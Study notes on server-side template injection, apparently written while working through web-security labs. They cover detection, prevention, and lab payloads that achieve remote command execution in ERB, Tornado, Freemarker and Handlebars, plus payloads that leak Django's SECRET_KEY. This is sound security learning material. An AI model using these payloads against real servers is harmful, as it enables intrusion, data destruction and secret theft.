- Server-side template injection is when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side.

- Template engines are designed to generate web pages by combining fixed templates with volatile data. Server-side template injection attacks can **occur when user input is concatenated directly into a template, rather than passed in as data**. As the name suggests, server-side template injection payloads are delivered and evaluated server-side, potentially making them much more dangerous than a typical client-side template injection.

- In certain rare circumstances, these vulnerabilities pose no real security risk. However, most of the time, the impact of server-side template injection can be catastrophic. At the severe end of the scale, an attacker can potentially achieve remote code execution, taking full control of the back-end server and using it to perform other attacks on internal infrastructure.

## How do server-side template injection vulnerabilities arise?

- Correct way to use a template (Twig): 
```javascript
$output = $twig->render("Dear {first_name},", array("first_name" => $user.first_name));
```

- Uncorrect and dangerous way to use a template:

```javascript
$output = $twig->render("Dear " . $_GET['name']);
```

This potentially allows an attacker to place a server-side template injection payload inside the `name` parameter as follows:

```http
http://vulnerable-website.com/?name={{bad-stuff-here}}
```


## Constructing a server-side template injection attack

Identifying server-side template injection vulnerabilities and crafting a successful attack typically involves the following high-level process:

![[Schermata del 2024-12-03 19-48-53.png]]

We can exploit the Server-Side Template Injection by:
- injecting a template and forcing an error to find out the template engine used;
- find vulnerabilities on the web for the template engine found previously.

#### Detect

- The simplest initial approach is to try fuzzing the template by injecting a sequence of special characters commonly used in template expressions, such as `${{<%[%'"}}%\`. If an exception is raised, this indicates that the injected template syntax is potentially being interpreted by the server in some way. This is one sign that a vulnerability to server-side template injection may exist.
- Another method is to first establish that the parameter doesn't contain a direct XSS vulnerability by injecting arbitrary HTML into the value:

```http
http://vulnerable-website.com/?greeting=data.username<tag>
```

In the absence of XSS, this will usually either result in a blank entry in the output, encoded tags, or an error message. The next step is to try and break out of the statement using common templating syntax and attempt to inject arbitrary HTML after it:

```http
http://vulnerable-website.com/?greeting=data.username}}<tag>
```

If this again results in an error or blank output, you have either used syntax from the wrong templating language or, if no template-style syntax appears to be valid, server-side template injection is not possible. Alternatively, if the output is rendered correctly, along with the arbitrary HTML, this is a key indication that a server-side template injection vulnerability is present:

```html
Hello Carlos<tag>
```

## Labs

###### Lab: Basic server-side template injection

Injection of Ruby code in ERB template:

```html
<%= system("rm /home/carlos/morale.txt") %>
```

###### Lab: Basic server-side template injection (code context)

Injection of Python code in Tornado template in the POST request `/my-account/change-blog-post-author-display` body:

```http
blog-post-author-display=__import__("os").system("rm morale.txt")&csrf=2D4a3iCBYfS5wGNUBfAmWN4EuIrvNE3t
```

###### Lab: Server-side template injection using documentation

Freemarker template (Java-based) injection and remote code execution:

```java
${"freemarker.template.utility.Execute"?new()("rm morale.txt")}
```

###### Lab: Server-side template injection in an unknown language with a documented exploit

See if there's XSS in the query parameters. Otherwise, template inject:

```
{{1/0}}
```

Handlebars template injection:

```
wrtz{{#with "s" as |string|}} 
{{#with "e"}} 
{{#with split as |conslist|}} 
{{this.pop}} 
{{this.push (lookup string.sub "constructor")}} 
{{this.pop}} 
{{#with string.split as |codelist|}} 
{{this.pop}} 
{{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}} 
{{this.pop}}
{{#each conslist}}
{{#with (string.sub.apply 0 codelist)}}
{{this}} 
{{/with}}
{{/each}}
{{/with}}
{{/with}} 
{{/with}}
{{/with}}
```

**NB: the injected code above must be URL-encoded (also the special character)!!**

###### Lab: Server-side template injection with information disclosure via user-supplied objects

To catch the **Django's SECRET_KEY** just inject:

```
{{settings.SECRET_KEY}}
```
or 
```
{% debug %}
```


## Prevention

- Don’t process user templates server-side
- If you have to, sandbox and disable dangerous modules
- Implement allowlist for allowed attributes
- Use **data binding** as much as possible. Don’t concatenate user strings with the template!


### SSTI vs [XSS](XSS%20(Cross-Site%20Scripting).md)

- XSS is usually made on client browser, while SSTI happens on server-side
- SSTI could imply XSS: if there's SSTI, there could be also XSS

SSTI is often mistaken for a simple XSS vulnerability. However, by setting mathematical operations as the value of the parameter, we can test whether this is also a potential entry point for a server-side template injection attack.
For example, consider a template that contains the following vulnerable code:

```javascript 
render('Hello ' + username)
```

During auditing, we might test for server-side template injection by requesting a URL such as:

```javascript
http://vulnerable-website.com/?username=${7*7}
```

If the resulting output contains `Hello 49`, this shows that the mathematical operation is being evaluated server-side.